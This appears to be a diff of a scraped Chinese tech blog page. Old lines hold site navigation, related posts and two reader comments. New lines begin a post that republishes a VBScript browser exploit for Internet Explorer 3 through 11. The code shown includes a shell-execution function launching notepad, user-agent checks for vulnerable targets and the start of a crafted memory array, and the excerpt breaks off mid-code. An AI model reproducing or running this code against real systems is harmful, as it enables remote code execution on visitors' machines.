data-lazy-src="https://laod.cn/wp-content/uploads/2017/07/ssl-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2017/07/ssl-480x300.jpg" width="480" height="300" alt="苹果开始打击辣鸡SSL证书 iOS 11不再信赖WoSign(沃通)证书"></noscript> </a> <a class="item-category" href="https://laod.cn/news" target="_blank">业界资讯</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/google%e3%80%81mozilla%e3%80%81apple-ssl-ios11.html" target="_blank" rel="bookmark"> 苹果开始打击辣鸡SSL证书 iOS 11不再信赖WoSign(沃通)证书 </a></h4><div class="item-excerpt"><p>苹果apple很久以前就发布过公告，将在 IOS 11发布后不再支持信任wosign证书：WoSign免费证书的签发者英文名是WoSign CA Free SSL Certific&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2017-07-25</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>11.5K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/google%e3%80%81mozilla%e3%80%81apple-ssl-ios11.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>5</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/lets-encrypt-wildcard.html" title="Let&#8217;s Encrypt 终于发布Wildcard（泛域名）证书了" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="Let&#8217;s Encrypt 终于发布Wildcard（泛域名）证书了" data-lazy-src="https://laod.cn/wp-content/uploads/2018/03/Lets-Encrypt-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2018/03/Lets-Encrypt-480x300.jpg" width="480" height="300" alt="Let&#8217;s Encrypt 终于发布Wildcard（泛域名）证书了"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/lets-encrypt-wildcard.html" target="_blank" rel="bookmark"> Let&#8217;s Encrypt 终于发布Wildcard（泛域名）证书了 </a></h4><div class="item-excerpt"><p>如题，Let&#8217;s Encrypt经过几轮的跳票后终于发布Wildcard（泛域名）证书了，民间叫：野卡 Let&#8217;s Encrypt是一个于2015年三季度推&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2018-03-19</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>5.3K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/lets-encrypt-wildcard.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>6</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/linux-tcp-sack-panic.html" title="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复" data-lazy-src="https://laod.cn/wp-content/uploads/2019/06/l0-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2019/06/l0-480x300.jpg" width="480" height="300" alt="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/linux-tcp-sack-panic.html" target="_blank" rel="bookmark"> Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复 </a></h4><div class="item-excerpt"><p>最近两天网上曝出：Linux 内核被曝存在TCP “SACK PANIC” 远程拒绝服务漏洞（漏洞编号：CVE-2019-11477,CVE-2019-11478,CVE-2019&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2019-06-21</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>2.7K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/linux-tcp-sack-panic.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>1</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/vbulletin-seo-vbseo.html" title="知名论坛系统vBulletin常用SEO插件VBSEO存在严重安全漏洞" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="知名论坛系统vBulletin常用SEO插件VBSEO存在严重安全漏洞" data-lazy-src="https://laod.cn/wp-content/uploads/2015/01/VBSEO-480x300.png"><noscript><img src="https://laod.cn/wp-content/uploads/2015/01/VBSEO-480x300.png" width="480" height="300" alt="知名论坛系统vBulletin常用SEO插件VBSEO存在严重安全漏洞"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/vbulletin-seo-vbseo.html" target="_blank" rel="bookmark"> 知名论坛系统vBulletin常用SEO插件VBSEO存在严重安全漏洞 </a></h4><div class="item-excerpt"><p>vBulletin团队近日向他们所有客户发出警告，其插件VBSEO出现了严重安全漏洞。VBSEO是一款应用于vBulletin且非常普及的第三方seo模块，糟糕的是VBSEO官方已&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2015-01-09</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>2.3K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/vbulletin-seo-vbseo.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li></ul></div><div id="comments" class="entry-comments"><div id="respond" class="comment-respond"><h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/security/win10-ie11-0day.html#respond" style="display:none;"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-close"></use></svg></i></a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="https://laod.cn/login?modal-type=login">登录</a>后才能评论</div> <button name="submit" type="submit" id="must-submit" class="btn btn-primary btn-xs submit">提交</button></div></div></div><h3 class="comments-title"> 评论列表（2条）</h3><ul class="comments-list"><li class="comment byuser even thread-even depth-1" id="comment-38281"><div id="div-comment-38281" class="comment-inner"><div class="comment-author vcard"> <img alt='xsleaf' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2060%2060'%3E%3C/svg%3E" data-lazy-srcset='//cravatar.cn/avatar/687f294128d290a118dfd88bd357f42e?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' data-lazy-src="//cravatar.cn/avatar/687f294128d290a118dfd88bd357f42e?s=60&#038;d=mm&#038;r=g" /><noscript><img alt='xsleaf' src='//cravatar.cn/avatar/687f294128d290a118dfd88bd357f42e?s=60&#038;d=mm&#038;r=g' srcset='//cravatar.cn/avatar/687f294128d290a118dfd88bd357f42e?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></noscript></div><div class="comment-body"><div class="nickname"><a class="j-user-card" data-user="6426" href="https://laod.cn/profile/6426" target="_blank">xsleaf</a> <span class="comment-time">2017-10-19 17:52</span></div><div class="comment-text"><p>点进来就提示病毒~~吼吼<br /> D好腻害</p></div></div><div class="reply"> <a rel="nofollow" class="comment-reply-login" href="javascript:;">回复</a></div></div></li><li class="comment odd alt thread-odd thread-alt depth-1" id="comment-2542"><div id="div-comment-2542" class="comment-inner"><div class="comment-author vcard"> <img alt='shaochenrui' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2060%2060'%3E%3C/svg%3E" data-lazy-srcset='//cravatar.cn/avatar/a1c5d7c70e66ef1739a3f1360b81e090?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' data-lazy-src="//cravatar.cn/avatar/a1c5d7c70e66ef1739a3f1360b81e090?s=60&#038;d=mm&#038;r=g" /><noscript><img alt='shaochenrui' src='//cravatar.cn/avatar/a1c5d7c70e66ef1739a3f1360b81e090?s=60&#038;d=mm&#038;r=g' srcset='//cravatar.cn/avatar/a1c5d7c70e66ef1739a3f1360b81e090?s=120&#038;d=mm&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></noscript></div><div class="comment-body"><div class="nickname">shaochenrui <span class="comment-time">2015-09-05 11:45</span></div><div class="comment-text"><p>这是什么意思呢？</p></div></div><div class="reply"> <a rel="nofollow" class="comment-reply-login" href="javascript:;">回复</a></div></div></li></ul><ul class="pagination"></ul></div></article></main><aside class="sidebar"><div id="wpcom-lastest-news-2" class="widget widget_lastest_news"><ul><li><a href="https://laod.cn/hosts/english-google-com.html" title="如何访问国际英文版谷歌？Google.com">如何访问国际英文版谷歌？Google.com</a></li><li><a href="https://laod.cn/news/wordpress-4-4-1-emoji.html" title="WordPress 4.4.1发布 安全和维护 支持最新emoji表情">WordPress 4.4.1发布 安全和维护 支持最新emoji表情</a></li><li><a href="https://laod.cn/news/cctv-360-steal-alipay.html" title="央视曝光：木马图片通过360免杀认证 盗取支付宝账号密码">央视曝光：木马图片通过360免杀认证 盗取支付宝账号密码</a></li><li><a href="https://laod.cn/tools/xunlei-p2p-shangzhuan.html" title="吸血鬼之 &#8211; 迅雷P2P">吸血鬼之 &#8211; 迅雷P2P</a></li><li><a href="https://laod.cn/news/google-now-launcher.html" title="Google Now Launcher 现在会强制统一应用图标大小">Google Now Launcher 现在会强制统一应用图标大小</a></li><li><a href="https://laod.cn/news/google-88yi.html" title="法国法院：谷歌不必补缴13亿美元（88亿人民币）巨额税款">法国法院：谷歌不必补缴13亿美元（88亿人民币）巨额税款</a></li></ul></div><div id="categories-4" class="widget widget_categories"><h3 class="widget-title"><span>分类</span></h3><ul><li class="cat-item cat-item-1129"><a href="https://laod.cn/dns" title="公共DNS、DNS推荐、DNS测试、DNS评测、纯净DNS、科学DNS">DNS</a></li><li class="cat-item cat-item-150"><a href="https://laod.cn/hosts" title="最新hosts,hosts下载,hosts文件,hosts修改,hosts文件在哪里">hosts</a></li><li class="cat-item cat-item-1197"><a href="https://laod.cn/ssl" title="SSL、SSL证书、HTTPS、TLS 1.3、HTTP/2等... ">SSL</a></li><li class="cat-item cat-item-6"><a href="https://laod.cn/news" title="安全界、科技界的新闻记录，各种逆天科技、火星科技、黑科技">业界资讯</a></li><li class="cat-item cat-item-99"><a href="https://laod.cn/code-audit" title="代码审计 0day漏洞 漏洞挖掘...">代码审计</a></li><li class="cat-item cat-item-1"><a href="https://laod.cn/free" title="一切精品的免费资源，空间、域名、网盘、主题、云等各种免费资源。">免费资源</a></li><li class="cat-item cat-item-3"><a href="https://laod.cn/tools" title="收集分享破解各种黑科技、火星科技、实用好用的、新奇有趣的工具软件。">工具软件</a></li><li class="cat-item cat-item-4"><a href="https://laod.cn/journal" title="心情随笔，谱写记录生活中的一些琐事。">心情琐事</a></li><li class="cat-item cat-item-9"><a href="https://laod.cn/mito" title="摄影美图，各种唯美图、创意图、壁纸">摄影|美图</a></li><li class="cat-item cat-item-1417"><a href="https://laod.cn/chajian" title="Chrome好用的插件,Chrome插件，Chrome扩展，Firefox插件，Firefox扩展">浏览器插件</a></li><li class="cat-item cat-item-33"><a href="https://laod.cn/movie" title="好看的美剧,美剧下载,2017美剧,好看的电影">电影·美剧</a></li><li class="cat-item cat-item-11"><a href="https://laod.cn/life" title="美文、唯美句子、人生、日记">直视人生</a></li><li class="cat-item cat-item-5"><a href="https://laod.cn/security" title="网络安全，信息安全，网站安全，黑客，白帽子，黑帽子">网络安全</a></li><li class="cat-item cat-item-8"><a href="https://laod.cn/page" title="网页设计，网页设置，网页代码">网页|代码</a></li><li class="cat-item cat-item-93"><a href="https://laod.cn/black-technology" title="远超越现今人类科技或知识所能及的范畴，缺乏科学根据并且违反自然原理的科学技术或者产品。">黑科技</a></li><li class="cat-item cat-item-1578"><a href="https://laod.cn/hackintosh" title="分享黑苹果完美配置清单，黑苹果驱动、软件等...">黑苹果</a></li></ul></div></aside></div></div><footer class="footer"><div class="container"><div class="clearfix"><div class="footer-col footer-col-copy"><ul class="footer-nav hidden-xs"><li id="menu-item-6954" class="menu-item menu-item-6954"><a href="https://laod.cn/disclaimer">免责声明</a></li><li id="menu-item-6955" class="menu-item menu-item-6955"><a href="https://laod.cn/about">关于本站</a></li></ul><div class="copyright"><p>Copyright © 2021 上林县月夕花朝网络科技有限公司 版权所有 <a href="http://beian.miit.gov.cn" target="_blank" rel="nofollow noopener">桂ICP备18011504号-6</a> Powered by <a href="https://www.luyouwang.net" target="_blank" rel="noopener">路由网</a></p></div></div><div class="footer-col footer-col-sns"><div class="footer-sns"></div></div></div></div></footer><div class="action action-style-0 action-color-0 action-pos-0" style="bottom:20%;"><div class="action-item j-share"> <i class="wpcom-icon wi action-item-icon"><svg aria-hidden="true"><use xlink:href="#wi-share"></use></svg></i></div><div class="action-item gotop j-top"> <i class="wpcom-icon wi action-item-icon"><svg aria-hidden="true"><use xlink:href="#wi-arrow-up-2"></use></svg></i></div></div> <script type='text/javascript' id='main-js-extra'>/* <![CDATA[ */ var _wpcom_js = {"webp":"","ajaxurl":"https:\/\/laod.cn\/wp-admin\/admin-ajax.php","theme_url":"https:\/\/laod.cn\/wp-content\/themes\/justnews","slide_speed":"5000","static_cdn":"0","is_admin":"0","lightbox":"1","post_id":"247","user_card_height":"356","poster":{"notice":"\u8bf7\u957f\u6309\u4fdd\u5b58\u56fe\u7247\uff0c\u5c06\u5185\u5bb9\u5206\u4eab\u7ed9\u66f4\u591a\u597d\u53cb","generating":"\u6b63\u5728\u751f\u6210\u6d77\u62a5\u56fe\u7247...","failed":"\u6d77\u62a5\u56fe\u7247\u751f\u6210\u5931\u8d25"},"video_height":"482","fixed_sidebar":"1","js_lang":{"page_loaded":"\u5df2\u7ecf\u5230\u5e95\u4e86","no_content":"\u6682\u65e0\u5185\u5bb9","load_failed":"\u52a0\u8f7d\u5931\u8d25\uff0c\u8bf7\u7a0d\u540e\u518d\u8bd5\uff01","login_desc":"\u60a8\u8fd8\u672a\u767b\u5f55\uff0c\u8bf7\u767b\u5f55\u540e\u518d\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\uff01","login_title":"\u8bf7\u767b\u5f55","login_btn":"\u767b\u5f55","reg_btn":"\u6ce8\u518c","copy_done":"\u590d\u5236\u6210\u529f\uff01","copy_fail":"\u6d4f\u89c8\u5668\u6682\u4e0d\u652f\u6301\u62f7\u8d1d\u529f\u80fd"},"login_url":"https:\/\/laod.cn\/login?modal-type=login","register_url":"https:\/\/laod.cn\/register?modal-type=register","captcha_label":"\u70b9\u51fb\u8fdb\u884c\u4eba\u673a\u9a8c\u8bc1","captcha_verified":"\u9a8c\u8bc1\u6210\u529f","errors":{"require":"\u4e0d\u80fd\u4e3a\u7a7a","email":"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u7535\u5b50\u90ae\u7bb1","pls_enter":"\u8bf7\u8f93\u5165","password":"\u5bc6\u7801\u5fc5\u987b\u4e3a6~32\u4e2a\u5b57\u7b26","passcheck":"\u4e24\u6b21\u5bc6\u7801\u8f93\u5165\u4e0d\u4e00\u81f4","phone":"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u624b\u673a\u53f7\u7801","terms":"\u8bf7\u9605\u8bfb\u5e76\u540c\u610f\u6761\u6b3e","sms_code":"\u9a8c\u8bc1\u7801\u9519\u8bef","captcha_verify":"\u8bf7\u70b9\u51fb\u6309\u94ae\u8fdb\u884c\u9a8c\u8bc1","captcha_fail":"\u70b9\u51fb\u9a8c\u8bc1\u5931\u8d25\uff0c\u8bf7\u91cd\u8bd5","nonce":"\u968f\u673a\u6570\u6821\u9a8c\u5931\u8d25","req_error":"\u8bf7\u6c42\u5931\u8d25"},"follow_btn":"<i class=\"wpcom-icon wi\"><svg aria-hidden=\"true\"><use xlink:href=\"#wi-add\"><\/use><\/svg><\/i>\u5173\u6ce8","followed_btn":"\u5df2\u5173\u6ce8","user_card":"1"}; /* ]]> */</script> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/js/main.js?ver=6.8.2' id='main-js'></script> <script type='text/javascript' src='https://laod.cn/wp-includes/js/comment-reply.min.js?ver=5.9.1' id='comment-reply-js'></script> <script type='text/javascript' id='wp-postviews-cache-js-extra'>/* <![CDATA[ */ var viewsCacheL10n = {"admin_ajax_url":"https:\/\/laod.cn\/wp-admin\/admin-ajax.php","post_id":"247"}; /* ]]> */</script> <script type='text/javascript' src='https://laod.cn/wp-content/plugins/wp-postviews/postviews-cache.js?ver=1.68' id='wp-postviews-cache-js'></script> <script>var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?677efe1890b1822233366a5d48b479a5";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();</script> <script type="application/ld+json">{
-            "@context": {
-                "@context": {
-                    "images": {
-                      "@id": "http://schema.org/image",
-                      "@type": "@id",
-                      "@container": "@list"
-                    },
-                    "title": "http://schema.org/headline",
-                    "description": "http://schema.org/description",
-                    "pubDate": "http://schema.org/DateTime"
-                }
-            },
-            "@id": "https://laod.cn/security/win10-ie11-0day.html",
-            "title": "win95+ie3-win10+ie11 浏览器执行漏洞",
-            "images": [],
-            "description": "//*&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;allie(win95+ie3-win10+ie11)&nbsp;dve&nbsp;&nbsp;&nbsp;&n...",
-            "pubDate": "2014-11-13T01:35:05",
-            "upDate": "2017-09-14T10:34:10"
-        }</script> <script>(function ($) {$(document).ready(function () {setup_share(1);})})(jQuery);</script> <script>window.lazyLoadOptions={elements_selector:"img[data-lazy-src],.rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}};window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){return}
-if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){return}
-images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
-if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://laod.cn/wp-content/plugins/wp-rocket/assets/js/lazyload/12.0/lazyload.min.js"></script></body></html>
-<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1646482991 -->
+<h1 id="title">win95+ie3-win10+ie11 浏览器执行漏洞</h1>
+<time id="date" datetime="2014-11-13T01:35:05+08:00">2014-11-13 01:35</time>
+<section id="content">
+    <div class="dp-highlighter">
+        <div class="bar"></div>
+        <ol start="1" class="dp-c">
+            <li class="alt">
+                <span
+                    ><span class="comment">//*</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;allie(win95+ie3-win10+ie11)&nbsp;dve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >*<span class="comment">//</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&lt;!doctype&nbsp;html&gt;&nbsp;&nbsp;</span>
+            </li>
+            <li class=""><span>&lt;html&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span
+                    >&lt;meta&nbsp;http-equiv=<span class="string"
+                        >“X-UA-Compatible”</span
+                    ><span>&nbsp;content=</span
+                    ><span class="string">“IE=EmulateIE8”</span
+                    ><span>&nbsp;&gt;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&lt;head&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&lt;/head&gt;&nbsp;&nbsp;</span></li>
+            <li class=""><span>&lt;body&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&lt;SCRIPT&nbsp;LANGUAGE=<span class="string"
+                        >“VBScript”</span
+                    ><span>&gt;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;runmumaa()&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span>On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >set&nbsp;shell=createobject(<span class="string"
+                        >“Shell.Application”</span
+                    ><span>)&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >shell.ShellExecute&nbsp;<span class="string"
+                        >“notepad.exe”</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >end&nbsp;<span class="keyword">function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>&lt;/script&gt;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&lt;SCRIPT&nbsp;LANGUAGE=<span class="string"
+                        >“VBScript”</span
+                    ><span>&gt;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>dim&nbsp;&nbsp;&nbsp;aa()&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>dim&nbsp;&nbsp;&nbsp;ab()&nbsp;&nbsp;</span>
+            </li>
+            <li class=""><span>dim&nbsp;&nbsp;&nbsp;a0&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>dim&nbsp;&nbsp;&nbsp;a1&nbsp;&nbsp;</span>
+            </li>
+            <li class=""><span>dim&nbsp;&nbsp;&nbsp;a2&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>dim&nbsp;&nbsp;&nbsp;a3&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span>dim&nbsp;&nbsp;&nbsp;win9x&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt">
+                <span>dim&nbsp;&nbsp;&nbsp;intVersion&nbsp;&nbsp;</span>
+            </li>
+            <li class=""><span>dim&nbsp;&nbsp;&nbsp;rnda&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>dim&nbsp;&nbsp;&nbsp;funclass&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span>dim&nbsp;&nbsp;&nbsp;myarray&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class=""><span>Begin()&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    ><span class="keyword">function</span
+                    ><span>&nbsp;Begin()&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="">
+                <span>&nbsp;&nbsp;info=Navigator.UserAgent&nbsp;&nbsp;</span>
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;<span class="keyword">if</span
+                    ><span>(instr(info,</span><span class="string">“Win64”</span
+                    ><span
+                        >)&gt;0)&nbsp;&nbsp;&nbsp;then&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >function</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;<span class="keyword">if</span
+                    ><span>&nbsp;(instr(info,</span
+                    ><span class="string">“MSIE”</span
+                    ><span
+                        >)&gt;0)&nbsp;&nbsp;&nbsp;then&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intVersion&nbsp;=&nbsp;CInt(Mid(info,&nbsp;InStr(info,&nbsp;<span
+                        class="string"
+                        >“MSIE”</span
+                    ><span
+                        >)&nbsp;+&nbsp;5,&nbsp;2))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                    ></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;<span class="keyword">else</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;&nbsp;<span
+                        class="keyword"
+                        >function</span
+                    ><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span
+                    ><span>&nbsp;&nbsp;</span></span
+                >
+            </li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt"><span>&nbsp;&nbsp;win9x=0&nbsp;&nbsp;</span></li>
+            <li class=""><span>&nbsp;&nbsp;&nbsp;</span></li>
+            <li class="alt">
+                <span>&nbsp;&nbsp;BeginInit()&nbsp;&nbsp;</span>
+            </li>
+            <li class="">
+                <span
+                    >&nbsp;&nbsp;If&nbsp;Create()=True&nbsp;Then&nbsp;&nbsp;</span
+                >
+            </li>
+            <li class="alt">
+                <span
+                    >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myarray=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chrw(01)&amp;chrw(2176)&amp;chrw(01)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&nbsp;&nbsp;</span
+                >
+            </li>
